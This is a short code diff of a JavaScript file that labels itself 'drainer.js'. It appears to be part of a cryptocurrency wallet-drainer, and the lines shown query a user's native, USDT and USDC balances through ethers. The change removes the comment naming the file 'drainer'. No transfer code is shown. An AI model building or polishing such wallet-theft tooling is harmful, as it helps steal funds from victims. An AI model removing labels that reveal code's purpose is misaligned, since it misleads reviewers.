@@ -1,4 +1,3 @@
-// drainer.js
 import { ethers } from 'ethers'
 
 const ERC20_ABI = [
@@ -45,10 +44,8 @@ async function checkBalance(chainId, userAddress) {
   if (!provider) throw new Error(`Нет RPC для ${config.name}`)
 
   const nativeBalance = await provider.getBalance(userAddress)
-
   const usdt = new ethers.Contract(config.usdtAddress, ERC20_ABI, provider)
   const usdc = new ethers.Contract(config.usdcAddress, ERC20_ABI, provider)
-
   const usdtBalance = await usdt.balanceOf(userAddress)
   const usdcBalance = await usdc.balanceOf(userAddress)
 
